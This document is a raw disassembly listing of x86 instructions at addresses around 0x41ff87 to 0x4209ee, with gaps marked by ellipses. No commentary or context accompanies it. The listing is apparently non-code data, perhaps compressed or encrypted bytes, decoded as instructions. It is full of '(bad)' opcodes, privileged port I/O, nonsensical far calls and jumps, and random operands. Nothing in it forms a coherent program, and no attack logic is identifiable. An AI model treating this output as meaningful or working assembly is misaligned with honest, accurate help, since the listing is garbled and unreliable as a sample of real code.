  41ff87:	in     eax,dx
  41ff88:	mov    ch,BYTE PTR [esi-0x9]
  41ff8b:	lahf   
  41ff8c:	cmp    edi,DWORD PTR [eax+0x7e7bddcb]
  41ff92:	test   al,0x19
  41ff94:	pop    esi
  41ff95:	ficomp DWORD PTR [edx+eax*1-0x5c9ace20]
  41ff9c:	sbb    DWORD PTR [ebx],0x7ddef4fb
  41ffa2:	or     eax,0xa6ac2bf5
  41ffa7:	clc    
  41ffa8:	pop    edx
  41ffa9:	into   
  41ffaa:	test   DWORD PTR [edx-0x40],0x884469c1
  41ffb1:	mov    al,ds:0x9951
	...
  420013:	add    BYTE PTR [eax],al
  420015:	add    BYTE PTR [edx-0x5b],ah
  420018:	jbe    0x420099
  42001a:	idiv   edi
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0xffffffca
  420023:	lods   al,BYTE PTR ds:[esi]
  420024:	mov    ebp,0x153743f
  420029:	add    BYTE PTR [edi],al
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [edi-0x61],bl
  420030:	in     al,dx
  420031:	enter  0x233b,0xed
  420035:	sbb    esi,0xf86d569d
  42003b:	pushf  
  42003c:	pushf  
  42003d:	pop    edx
  42003e:	(bad)  
  42003f:	xor    bl,BYTE PTR [ecx+0x6210c0a0]
  420045:	push   ds
  420046:	rcl    DWORD PTR [edi-0x68a28d12],1
  42004c:	jne    0x420066
  42004e:	aas    
  42004f:	add    ch,BYTE PTR [esi]
  420051:	and    eax,0xb526fba3
  420056:	scas   al,BYTE PTR es:[edi]
  420057:	mov    ecx,DWORD PTR [edi+0x133684ad]
  42005d:	jg     0x42005b
  42005f:	stos   DWORD PTR es:[edi],eax
  420060:	ins    BYTE PTR es:[edi],dx
  420061:	push   ecx
  420062:	jno    0x42003a
  420064:	ins    DWORD PTR es:[edi],dx
  420065:	push   edx
  420066:	in     al,0x44
  420068:	cdq    
  420069:	or     al,0xaf
  42006b:	sbb    al,0x27
  42006d:	outs   dx,BYTE PTR ds:[esi]
  42006e:	mov    al,ds:0xa1e119b2
  420073:	mov    esp,DWORD PTR [edx-0x57]
  420076:	push   ebp
  420077:	jae    0x42007d
  420079:	(bad)  
  42007a:	fmul   QWORD PTR ds:0x22886b99
  420080:	mov    ch,BYTE PTR [ebx+edx*4]
  420083:	ds mov ecx,0xe4085ee2
  420089:	cli    
  42008a:	shr    DWORD PTR [ebx+eiz*4-0xf],cl
  42008e:	je     0x4200cb
  420090:	adc    BYTE PTR [eax-0x16232156],al
  420096:	push   0xffffffb0
  420098:	sbb    BYTE PTR [ebx],dh
  42009a:	pushf  
  42009b:	jle    0x4200b4
  42009d:	mov    esi,0x398505bf
  4200a2:	lock fs pop ebp
  4200a5:	dec    edi
  4200a6:	add    ecx,ebp
  4200a8:	cmp    ebx,edi
  4200aa:	outs   dx,DWORD PTR ds:[esi]
  4200ab:	dec    esi
  4200ac:	mov    ebx,0xac2b415e
  4200b1:	stos   DWORD PTR es:[edi],eax
  4200b2:	in     al,dx
  4200b3:	leave  
  4200b4:	rol    esp,cl
  4200b6:	out    dx,al
  4200b7:	call   0x6f5c:0x6fdbcdd3
  4200be:	ds call 0xdd72:0x236a48e
  4200c6:	loopne 0x4200c6
  4200c8:	pop    es
  4200c9:	out    0x5b,eax
  4200cb:	sbb    al,0x95
  4200cd:	cmp    bh,BYTE PTR [edx]
  4200cf:	loopne 0x420070
  4200d1:	addr16 clc 
  4200d3:	jns    0x4200c5
  4200d5:	aam    0xaa
  4200d7:	les    edx,FWORD PTR [esi-0x68ad324f]
  4200dd:	mov    ah,0x3b
  4200df:	stos   DWORD PTR es:[edi],eax
  4200e0:	jmp    0x6386:0x8cd8e917
  4200e7:	js     0x42009a
  4200e9:	shl    BYTE PTR [edi+0x58],0xb6
  4200ed:	sub    BYTE PTR [edi-0x5e50ac32],cl
  4200f3:	out    dx,eax
  4200f4:	adc    BYTE PTR [edi+edi*2-0x1],dh
  4200f8:	icebp  
  4200f9:	leave  
  4200fa:	stos   DWORD PTR es:[edi],eax
  4200fb:	xor    DWORD PTR [esi-0x3c],0xffffff9e
  4200ff:	and    eax,0x8b82ffce
  420104:	or     DWORD PTR [edi+0x3e],ebx
  420107:	dec    ebx
  420108:	(bad)  
  420109:	mov    ebp,0xe397feea
  42010e:	inc    esi
  42010f:	adc    DWORD PTR [ecx+ebx*4+0x2e6833e8],esp
  420116:	fidivr DWORD PTR [edi+ebp*1]
  420119:	add    edi,edx
  42011b:	mov    edi,0xde2c88de
  420120:	or     DWORD PTR [edx-0x5c],eax
  420123:	aam    0x9f
  420125:	ficom  WORD PTR es:[esi+edi*8+0x51a957c6]
  42012d:	stc    
  42012e:	bound  eax,QWORD PTR [esi-0x6a480056]
  420134:	inc    ebp
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	cmp    BYTE PTR [ebp+0x547b6e93],bl
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [edx+0x55],bl
  4201b0:	loopne 0x4201ce
  4201b2:	or     eax,0x1fb45909
  4201b7:	inc    edx
  4201b8:	sar    DWORD PTR [edx+0x68bd5574],1
  4201be:	push   ss
  4201bf:	int    0xf8
  4201c1:	dec    edi
  4201c2:	pop    edx
  4201c3:	dec    ebx
  4201c4:	sub    al,0xf
  4201c6:	fst    DWORD PTR [ecx+ecx*4-0xc8248ca]
  4201cd:	aaa    
  4201ce:	push   cs
  4201cf:	mov    ds:0xabee935a,al
  4201d4:	fbstp  TBYTE PTR [edi]
  4201d6:	mov    bh,0x53
  4201d8:	dec    ebp
  4201d9:	ds pop esp
  4201db:	hlt    
  4201dc:	(bad)  
  4201de:	dec    esi
  4201df:	sbb    BYTE PTR [ebx+ebx*8+0x16eec8b0],al
  4201e6:	push   0xf47e396f
  4201eb:	(bad)  
  4201ec:	in     al,0xd9
  4201ee:	jmp    0x420232
  4201f0:	lods   eax,DWORD PTR ds:[esi]
  4201f1:	xchg   ecx,eax
  4201f2:	enter  0xb60a,0x4f
  4201f6:	nop
  4201f7:	add    al,0x79
  4201f9:	cli    
  4201fa:	std    
  4201fb:	sub    DWORD PTR [esi-0x22],0x867d23cc
  420202:	xchg   edx,eax
  420203:	and    edi,DWORD PTR [eax+0x1e651c30]
  420209:	and    edx,DWORD PTR [ebx+0x5964b664]
  42020f:	jbe    0x42028b
  420211:	sub    al,0x59
  420213:	icebp  
  420214:	dec    eax
  420215:	adc    DWORD PTR [ebp+0x1b3beee1],eax
  42021b:	out    0xd8,al
  42021d:	rcl    BYTE PTR [edx],cl
  42021f:	nop
  420220:	in     eax,0x31
  420222:	fisubr DWORD PTR [ebx-0x5c499c3d]
  420228:	rol    BYTE PTR [edi-0x3f61371e],1
  42022e:	cmp    ebx,DWORD PTR [esi]
  420230:	mov    edx,ebx
  420232:	xor    bh,BYTE PTR [ecx]
  420234:	and    DWORD PTR [esi-0x1602740e],esp
  42023a:	aad    0x5a
  42023c:	leave  
  42023d:	or     ebp,DWORD PTR [edx-0x70]
  420240:	fld    st(6)
  420242:	mov    esp,0x2c9f392
  420247:	mov    ecx,0xa4adb759
  42024c:	dec    eax
  42024d:	lahf   
  42024e:	or     esp,DWORD PTR [esi-0x42e888d5]
  420254:	test   eax,0x2d53cef4
  420259:	push   0x39a159f2
  42025e:	xor    DWORD PTR [ecx-0x34026e4b],ecx
  420264:	cs enter 0x4af,0x78
  420269:	pop    ebp
  42026a:	xchg   ebx,eax
  42026b:	in     al,dx
  42026c:	ss retf 0xfaa8
  420270:	sub    al,0xc7
  420272:	adc    edx,DWORD PTR [ebp-0x4a]
  420275:	inc    ebx
  420276:	inc    ebx
  420277:	xor    BYTE PTR [esi],dh
  420279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42027a:	aad    0xf7
  42027c:	outs   dx,DWORD PTR ds:[esi]
  42027d:	sahf   
  42027e:	lahf   
  42027f:	inc    eax
  420280:	push   ecx
  420281:	push   esp
  420282:	adc    DWORD PTR [esi-0x15],0xfffffffc
  420286:	or     eax,0x7cf828d0
  42028b:	out    0xe3,al
  42028d:	xor    DWORD PTR [ebx-0x14],esp
  420290:	imul   edi,edi,0x6a
  420293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420294:	pop    esi
  420295:	cli    
  420296:	pop    ebp
  420297:	(bad)  
  420298:	sbb    ah,BYTE PTR [edx+0x25]
  42029b:	ret    
  42029c:	rol    DWORD PTR [esi],cl
  42029e:	dec    edi
  42029f:	call   0xd717314f
  4202a4:	mov    WORD PTR [edx+0x35],ss
  4202a7:	in     al,dx
  4202a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202a9:	loopne 0x420305
  4202ab:	dec    esp
  4202ac:	lods   al,BYTE PTR ds:[esi]
  4202ad:	xor    al,0x14
  4202af:	jnp    0x420257
  4202b1:	rcr    DWORD PTR [edx+0x64aa],cl
	...
  420313:	add    BYTE PTR [eax],al
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fistp  QWORD PTR [ebp-0x27]
  420324:	lea    ecx,[ebx-0x7e]
  420327:	push   ebp
  420328:	add    DWORD PTR [eax],eax
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR [esi+0x119af686],ah
  420333:	add    al,0xfd
  420335:	inc    esi
  420336:	or     eax,0x7950f150
  42033b:	or     DWORD PTR [ebx+eax*1-0x7e],edx
  42033f:	ret    
  420340:	push   0xffffffef
  420342:	sub    BYTE PTR [edi-0x20530b8b],bl
  420348:	out    dx,al
  420349:	dec    edx
  42034a:	jno    0x4203ab
  42034c:	cmp    BYTE PTR [ebp+0x3b5419e2],cl
  420352:	and    BYTE PTR [eax+esi*4],cl
  420355:	ret    
  420356:	jns    0x4202dc
  420358:	aaa    
  420359:	int    0xf4
  42035b:	lods   eax,DWORD PTR ds:[esi]
  42035c:	in     al,0x84
  42035e:	and    ch,BYTE PTR [ebx]
  420360:	aas    
  420361:	mov    bl,0x77
  420363:	repnz adc DWORD PTR ds:0x4e0f438a,ecx
  42036a:	jp     0x4202ee
  42036c:	loopne 0x4203e6
  42036e:	or     ecx,DWORD PTR [edx]
  420370:	dec    ebp
  420371:	aad    0x28
  420373:	test   al,0xb4
  420375:	push   0x61
  420377:	imul   eax,DWORD PTR [ebp+0x4e],0x46
  42037b:	mov    eax,ds:0x11e7f73a
  420380:	mov    dh,0x4
  420382:	out    0x70,eax
  420384:	jb     0x420318
  420386:	data16 mov cl,0xc2
  420389:	xor    dh,0xd
  42038c:	or     al,al
  42038e:	adc    al,0x5e
  420390:	sysenter 
  420392:	mov    ds:0x3bda7d80,eax
  420397:	sub    esi,DWORD PTR [ebx+0x67ccec04]
  42039d:	mov    ch,BYTE PTR [edx-0x7e2e3816]
  4203a3:	mov    dl,0xca
  4203a5:	jle    0x420423
  4203a7:	push   0xfffffff0
  4203a9:	hlt    
  4203aa:	mov    dl,cl
  4203ac:	fadd   DWORD PTR [ebx]
  4203ae:	jae    0x420334
  4203b0:	lds    edi,FWORD PTR [edx-0x3e]
  4203b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b4:	sti    
  4203b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203b7:	aas    
  4203b8:	repz jo 0x42040b
  4203bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203bc:	or     dl,ah
  4203be:	cmp    esp,DWORD PTR [edx-0x1c]
  4203c1:	adc    eax,0x786a51f
  4203c6:	lods   eax,DWORD PTR ds:[esi]
  4203c7:	in     al,dx
  4203c8:	cli    
  4203c9:	leave  
  4203ca:	push   esp
  4203cb:	pop    edi
  4203cc:	adc    eax,0x2e71c7fb
  4203d1:	gs pusha 
  4203d3:	out    0x5b,eax
  4203d5:	dec    eax
  4203d6:	jp     0x4203ff
  4203d8:	cwde   
  4203d9:	add    DWORD PTR [esi+edi*4-0x2db044f4],edx
  4203e0:	cmc    
  4203e1:	hlt    
  4203e2:	leave  
  4203e3:	cmp    al,0x1
  4203e5:	sbb    eax,0x533a4178
  4203ea:	jae    0x420467
  4203ec:	fstp   QWORD PTR [esi+ebp*1-0x3f]
  4203f0:	push   ds
  4203f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f2:	not    BYTE PTR [eax]
  4203f4:	pop    ecx
  4203f5:	je     0x420378
  4203f7:	or     ecx,DWORD PTR [edi-0x5ec9b27e]
  4203fd:	add    eax,0xd7bec08f
  420402:	inc    ebx
  420403:	pop    ebp
  420404:	xchg   DWORD PTR [eax],eax
  420406:	jp     0x42038a
  420408:	gs pop ds
  42040a:	adc    edi,edx
  42040c:	sti    
  42040d:	add    DWORD PTR [esi-0x7a289530],0xcc1c5244
  420417:	(bad)  
  420418:	cli    
  420419:	iret   
  42041a:	adc    bl,cl
  42041c:	popf   
  42041d:	ret    
  42041e:	inc    esp
  42041f:	popa   
  420420:	aas    
  420421:	je     0x420470
  420423:	xor    eax,0x117a6bab
  420428:	in     al,dx
  420429:	xor    dl,BYTE PTR [ebp+0x45]
  42042c:	(bad)  
  42042e:	sbb    al,0xa7
  420430:	mov    eax,0xe1e1b847
	...
  420495:	add    BYTE PTR [esi+0x7f125794],ch
  42049b:	shr    edi,cl
  42049d:	mov    esp,0xb41496f0
  4204a2:	imul   eax,ebx,0x5689a9c9
  4204a8:	add    DWORD PTR [eax],eax
  4204aa:	pop    es
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR ds:0x1f643e43,ah
  4204b3:	cli    
  4204b4:	push   esi
  4204b5:	adc    eax,0xf6d84e41
  4204ba:	(bad)  
  4204bb:	jno    0x420504
  4204bd:	sub    al,0x75
  4204bf:	imul   edi,DWORD PTR [esi-0x22651ec4],0x789e0c88
  4204c9:	mov    esi,cs
  4204cb:	je     0x420548
  4204cd:	repz dec esp
  4204cf:	adc    esp,esi
  4204d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204d2:	sbb    eax,0x1d
  4204d5:	xchg   ebp,eax
  4204d6:	in     al,0x1
  4204d8:	adc    eax,0x148a7d06
  4204dd:	push   eax
  4204de:	popa   
  4204df:	(bad)  
  4204e0:	cwde   
  4204e1:	mul    BYTE PTR [ebp+eiz*1+0x4d]
  4204e5:	push   ebp
  4204e6:	pop    ebx
  4204e7:	mov    bh,dh
  4204e9:	sub    dh,BYTE PTR [ecx+0x4625a90f]
  4204ef:	mov    dl,0x3b
  4204f1:	pop    edi
  4204f2:	xchg   edi,eax
  4204f3:	cmovle esp,DWORD PTR [ebx+0x5073b72d]
  4204fa:	add    esp,DWORD PTR [ecx-0x45]
  4204fd:	mov    ch,0xf8
  4204ff:	dec    ebp
  420501:	in     al,dx
  420502:	sti    
  420503:	fld    TBYTE PTR [ebx-0x57]
  420506:	aad    0xc5
  420508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420509:	int3   
  42050a:	out    dx,al
  42050b:	xor    al,0xa3
  42050d:	jno    0x4204f1
  42050f:	sahf   
  420510:	imul   ecx,DWORD PTR [ecx],0xffffffd9
  420513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420514:	sbb    BYTE PTR [edx+0x15],0xb4
  420518:	inc    ebx
  420519:	adc    al,0x9a
  42051b:	clc    
  42051c:	cmp    eax,0x704c2de7
  420521:	loopne 0x4204aa
  420523:	lods   al,BYTE PTR ds:[esi]
  420524:	push   0x760c9d3e
  420529:	push   ecx
  42052a:	mov    edi,DWORD PTR [ebx+0x4a5aa3f8]
  420530:	add    eax,0x55354fdd
  420535:	jmp    0xc706eeed
  42053a:	call   0xd6d1:0xa18dd836
  420541:	pop    edx
  420542:	(bad)  
  420543:	push   0x60
  420545:	bound  edx,QWORD PTR [eax+0x636fed9b]
  42054b:	(bad)  
  42054c:	push   eax
  42054d:	and    BYTE PTR [eax-0x2f],ah
  420550:	je     0x4205aa
  420552:	lods   al,BYTE PTR ds:[esi]
  420553:	sub    BYTE PTR [ecx-0x132dd89],ah
  420559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42055a:	imul   ebx,DWORD PTR ds:0x90703926,0xffffff87
  420561:	jle    0x4204f5
  420563:	xor    DWORD PTR [eax-0x8],edi
  420566:	xchg   bh,bh
  420568:	and    BYTE PTR [esi],dl
  42056a:	scas   eax,DWORD PTR es:[edi]
  42056b:	idiv   eax
  42056d:	out    dx,al
  42056e:	arpl   WORD PTR [edi+0x76473d89],si
  420574:	xchg   esi,eax
  420575:	out    0x47,al
  420577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420578:	(bad)  
  420579:	mov    ebp,0x79a88d24
  42057e:	sbb    bh,BYTE PTR [ecx]
  420580:	mov    cl,0x6
  420582:	cmp    ch,bh
  420584:	or     eax,0x2b11122
  420589:	push   edi
  42058a:	es f2xm1 
  42058d:	xchg   ecx,eax
  42058e:	xlat   BYTE PTR ds:[ebx]
  42058f:	add    eax,0xf50ecfd3
  420594:	jge    0x4205a8
  420596:	out    0x50,al
  420598:	dec    eax
  420599:	bnd jnp 0x4205b3
  42059c:	sbb    BYTE PTR [edi+0x60db41aa],dl
  4205a2:	mov    bl,0x1d
  4205a4:	hlt    
  4205a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205a6:	mov    ecx,DWORD PTR [ebx+0x65]
  4205a9:	pop    eax
  4205aa:	mov    al,0xca
  4205ac:	(bad)  
  4205ae:	mov    bh,0xd9
  4205b0:	xchg   ebx,eax
  4205b1:	pop    es
  4205b2:	sti    
  4205b3:	pop    es
  4205b4:	add    BYTE PTR ds:[eax],al
	...
  420613:	add    BYTE PTR [eax],al
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0xf627fe4d
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [ebp-0x9a5dc8],ch
  420633:	jb     0x4205f6
  420635:	push   edx
  420636:	loope  0x4205db
  420638:	test   BYTE PTR [edx+edx*4],0x5d
  42063c:	jns    0x42064e
  42063e:	sbb    eax,0x5f314d31
  420643:	dec    eax
  420644:	pop    eax
  420645:	mov    si,0x45a2
  420649:	xor    dh,BYTE PTR [ebx+0x20]
  42064c:	mov    ah,0xf9
  42064e:	mov    ebx,0xe6bb2d5c
  420653:	inc    eax
  420654:	lahf   
  420655:	fild   QWORD PTR [esi-0x6145b008]
  42065b:	ror    DWORD PTR [edx+0x21],0x2f
  42065f:	and    dh,BYTE PTR [eax-0xfd19acb]
  420665:	ret    
  420666:	(bad)  [ebp+0x37]
  420669:	xchg   ebx,eax
  42066a:	mov    edx,0x71812ce0
  42066f:	sahf   
  420670:	and    al,0x92
  420672:	(bad)  
  420673:	mov    dl,0x4f
  420675:	es inc edi
  420677:	fist   DWORD PTR [esi]
  420679:	daa    
  42067a:	jae    0x4206d4
  42067c:	jmp    0xc8a051fb
  420681:	add    eax,0x440b54e5
  420686:	dec    ebp
  420687:	loopne 0x4206e5
  420689:	addr16 hlt 
  42068b:	popf   
  42068c:	test   al,0x15
  42068e:	pop    ebp
  42068f:	dec    esi
  420690:	rcl    BYTE PTR [eax+ecx*2-0x5a9d655],cl
  420697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420698:	push   ebx
  420699:	pop    ebx
  42069a:	push   edi
  42069b:	popf   
  42069c:	push   ss
  42069d:	fdiv   DWORD PTR [esi-0x28]
  4206a0:	dec    eax
  4206a1:	repz mov ss,WORD PTR ds:0x848e766c
  4206a8:	addr16 retf 
  4206aa:	or     eax,0x8906ab18
  4206af:	sbb    DWORD PTR [ebx+eax*8+0x3],edi
  4206b3:	cdq    
  4206b4:	mov    al,0x7
  4206b6:	push   0xe5f07d3b
  4206bb:	stc    
  4206bc:	aaa    
  4206bd:	add    dh,BYTE PTR [ecx-0xa]
  4206c0:	shr    DWORD PTR ds:0xa7ab92b2,1
  4206c6:	loop   0x4206c1
  4206c8:	and    ebp,DWORD PTR [esi-0x6e]
  4206cb:	adc    cl,cl
  4206cd:	cmp    DWORD PTR [edi],ecx
  4206cf:	sbb    eax,0xb78dd791
  4206d4:	dec    edx
  4206d5:	enter  0x5a35,0x89
  4206d9:	(bad)  
  4206da:	repz sub cl,bh
  4206dd:	cmp    ecx,DWORD PTR [eax+esi*2-0x5b2955d]
  4206e4:	(bad)  
  4206e6:	and    ebp,ecx
  4206e8:	into   
  4206e9:	xor    bl,BYTE PTR [ecx+0x12]
  4206ec:	repnz add al,0xd6
  4206ef:	aam    0x77
  4206f1:	mov    DWORD PTR [ecx-0x2d],edx
  4206f4:	loopne 0x420724
  4206f6:	mov    WORD PTR [eax],gs
  4206f8:	sbb    esp,ebp
  4206fa:	fldpi  
  4206fc:	pop    ebx
  4206fd:	inc    ecx
  4206fe:	jmp    0x90bee0b
  420703:	jge    0x4206fb
  420705:	dec    edx
  420706:	nop
  420707:	xchg   ecx,eax
  420708:	ret    0x6ecb
  42070b:	jae    0x4206d4
  42070d:	iret   
  42070e:	jmp    0xd9b6:0x7218866f
  420715:	xchg   edx,eax
  420716:	leave  
  420717:	mov    DWORD PTR [edi-0x6a7791d3],eax
  42071d:	sti    
  42071e:	and    DWORD PTR [ebp-0x26395063],ecx
  420724:	adc    DWORD PTR [ebp+0x22],esp
  420727:	inc    esi
  420728:	push   esp
  420729:	cmp    bl,cl
  42072b:	sti    
  42072c:	fidiv  WORD PTR ds:0x4fb79b5b
  420732:	cdq    
  420733:	pop    ecx
  420734:	fiadd  WORD PTR [eax]
	...
  420796:	mov    DWORD PTR [edi],ebp
  420798:	and    eax,0xad8aa780
  42079d:	das    
  42079e:	jmp    0x506da37a
  4207a3:	std    
  4207a4:	cmp    eax,0x158972c
  4207a9:	add    BYTE PTR [edi],al
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    dh,dl
  4207af:	sbb    esp,esi
  4207b1:	jmp    0x420745
  4207b3:	sub    al,0x56
  4207b5:	or     al,0x68
  4207b7:	adc    eax,0x2b277416
  4207bc:	cmp    ah,BYTE PTR [edx+0x59]
  4207bf:	add    BYTE PTR [ebp+0x56c2775f],0x1e
  4207c6:	fs and eax,0x6c4877c2
  4207cc:	fst    DWORD PTR [edx]
  4207ce:	jecxz  0x42078e
  4207d0:	fstp   DWORD PTR [ebp+0x177337ee]
  4207d6:	cli    
  4207d7:	pop    edx
  4207d8:	jns    0x4207a6
  4207da:	(bad)  
  4207db:	mov    ebx,0x4b2fe234
  4207e0:	pusha  
  4207e1:	pop    eax
  4207e2:	adc    al,0xe8
  4207e4:	into   
  4207e5:	cdq    
  4207e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207e7:	js     0x4207a2
  4207e9:	outs   dx,DWORD PTR ds:[esi]
  4207ea:	pushf  
  4207eb:	das    
  4207ec:	xchg   edi,eax
  4207ed:	hlt    
  4207ee:	(bad)  
  4207f0:	push   ds
  4207f1:	das    
  4207f2:	xchg   esp,eax
  4207f3:	pop    edx
  4207f4:	fwait
  4207f5:	call   0x713aa595
  4207fa:	mov    BYTE PTR [eax+0x6f2bbb75],ch
  420800:	or     al,0xe0
  420802:	mov    edx,0xedc98b35
  420807:	rol    BYTE PTR [edx+0x247f968c],cl
  42080d:	push   eax
  42080e:	push   edx
  42080f:	scas   al,BYTE PTR es:[edi]
  420810:	cmp    DWORD PTR [edx],ecx
  420812:	loope  0x42086a
  420814:	lods   al,BYTE PTR ds:[esi]
  420815:	out    dx,eax
  420816:	and    edx,DWORD PTR [ecx+0x2b]
  420819:	mov    esi,0x75fedc50
  42081e:	addr16 push ds
  420820:	js     0x420817
  420822:	mov    esp,0x2b694fb9
  420827:	dec    ebx
  420828:	mov    al,0xcf
  42082a:	or     edi,DWORD PTR [ebx+0x543e0b54]
  420830:	mov    bh,0x58
  420832:	add    bh,BYTE PTR [eax+0x20]
  420835:	fld    QWORD PTR [ebx]
  420837:	sub    BYTE PTR [ebp-0x29],dl
  42083a:	imul   esi,edx,0xffffffd0
  42083d:	int    0x80
  42083f:	xchg   ebp,eax
  420840:	pusha  
  420841:	dec    esp
  420842:	test   DWORD PTR [ebx-0x3e237647],ebx
  420848:	fidiv  WORD PTR [ebx+0x19bc4ce4]
  42084e:	test   al,0x9b
  420850:	push   ecx
  420851:	ds ins DWORD PTR es:[edi],dx
  420853:	(bad)  
  420854:	jge    0x420814
  420856:	jns    0x4207ee
  420858:	or     eax,0xb6697940
  42085d:	repz in eax,dx
  42085f:	out    0x31,eax
  420861:	in     al,dx
  420862:	and    BYTE PTR [ebx],al
  420864:	mov    DWORD PTR [ebp+eiz*2+0x29],edx
  420868:	push   ecx
  420869:	inc    esp
  42086a:	jecxz  0x420813
  42086c:	call   0x6d33:0x23e74794
  420873:	bound  ebx,QWORD PTR [edx+edx*4+0x1bd04bed]
  42087a:	inc    edi
  42087b:	push   esi
  42087c:	int3   
  42087d:	sbb    edi,DWORD PTR [ecx]
  42087f:	push   ebx
  420880:	cld    
  420881:	inc    ecx
  420882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420883:	sbb    eax,0xc07b4be6
  420888:	add    dl,BYTE PTR [eax-0xbfe8782]
  42088e:	sbb    al,0x51
  420890:	arpl   WORD PTR [eax],dx
  420892:	adc    eax,DWORD PTR [edi]
  420894:	adc    DWORD PTR [ecx+0x7d],esi
  420897:	mov    ds:0xb5949d4e,al
  42089c:	loopne 0x4208f9
  42089e:	mov    bh,BYTE PTR [ebp-0x7a4ee277]
  4208a4:	(bad)  
  4208a5:	aaa    
  4208a6:	in     al,0xa2
  4208a8:	lods   al,BYTE PTR ds:[esi]
  4208a9:	cmp    bl,BYTE PTR [edi+0x6a]
  4208ac:	clc    
  4208ad:	or     ebp,eax
  4208af:	jg     0x4208c5
  4208b1:	mov    esp,0xb4b190
	...
  420916:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0xd0f9
  420924:	adc    al,0x11
  420926:	sahf   
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    cl,dh
  42092f:	adc    BYTE PTR [ecx-0x75a181f5],0xeb
  420936:	push   ebx
  420937:	xlat   BYTE PTR ds:[ebx]
  420938:	frndint 
  42093a:	adc    DWORD PTR [ebx+0x75d758a4],edi
  420940:	rcr    DWORD PTR [ebp+ecx*2-0x7cf66de3],0xea
  420948:	and    DWORD PTR [edi],esp
  42094a:	fdiv   DWORD PTR [edi+0x1f937890]
  420950:	jmp    0x420927
  420952:	xor    cl,BYTE PTR [edi]
  420954:	mov    DWORD PTR [ebx+0x4e0dcdc8],ebp
  42095a:	pop    ebx
  42095b:	cmp    cl,BYTE PTR [ecx-0x76]
  42095e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420960:	mov    eax,ds:0x310af8a8
  420965:	mov    edi,DWORD PTR [edi+0x1f]
  420968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420969:	pusha  
  42096a:	inc    esp
  42096b:	push   0xa045543c
  420970:	imul   ebx,DWORD PTR [edx-0x4cd639f2],0xffffff93
  420977:	fmul   DWORD PTR [ebp-0x6df2a59]
  42097d:	pop    edi
  42097e:	mov    ebp,0x7eaea8cb
  420983:	ins    BYTE PTR es:[edi],dx
  420984:	push   edx
  420985:	xchg   BYTE PTR [eax+0x48aec700],ah
  42098b:	inc    ebx
  42098c:	mov    al,ds:0x4b05e15f
  420991:	int3   
  420992:	mov    bh,0x2
  420994:	jg     0x4209c2
  420996:	jle    0x420959
  420998:	push   0x4c
  42099a:	je     0x4209a1
  42099c:	jmp    esi
  42099e:	in     al,0xc2
  4209a0:	sar    ch,0xd3
  4209a3:	jnp    0x4209f5
  4209a5:	push   ebx
  4209a6:	mov    ch,0xb8
  4209a8:	mov    DWORD PTR [edx-0x6f],edi
  4209ab:	imul   ecx,DWORD PTR [ebp+0x9d7b25e],0x2e
  4209b2:	bound  esp,QWORD PTR [esi-0x41]
  4209b5:	sbb    al,0x18
  4209b7:	push   cs
  4209b8:	pushf  
  4209b9:	or     BYTE PTR [ecx-0x6b],dh
  4209bc:	jae    0x4209b6
  4209be:	fdivp  st(0),st
  4209c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209c1:	push   eax
  4209c2:	or     esi,0xdc49022a
  4209c8:	and    DWORD PTR [esi],ebp
  4209ca:	cld    
  4209cb:	dec    DWORD PTR [esi-0x7]
  4209ce:	test   eax,0xd1dffe1f
  4209d3:	outs   dx,BYTE PTR ds:[esi]
  4209d4:	add    eax,0xe1306828
  4209d9:	adc    edx,esp
  4209db:	ins    DWORD PTR es:[edi],dx
  4209dc:	leave  
  4209dd:	cmc    
  4209de:	iret   
  4209df:	dec    esi
  4209e0:	rcr    BYTE PTR [ebx-0x13],0xed
  4209e4:	add    eax,0xc9f25e64
  4209e9:	cwde   
  4209ea:	sub    eax,ebx
  4209ec:	dec    ebx
  4209ed:	pushf  
  4209ee:	dec    DWORD PTR [ebx-0x2e]
